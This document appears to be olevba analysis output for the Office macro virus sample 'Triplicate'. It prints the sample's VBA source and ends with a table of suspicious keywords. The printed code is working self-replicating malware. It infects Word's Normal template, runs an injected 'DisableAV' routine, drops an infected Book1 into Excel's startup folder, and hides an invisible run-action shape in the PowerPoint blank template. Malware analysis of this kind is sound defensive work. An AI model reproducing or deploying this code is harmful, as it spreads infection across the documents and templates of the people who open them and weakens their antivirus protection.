olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.ap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Triplicate.ap - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















































































































 '
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

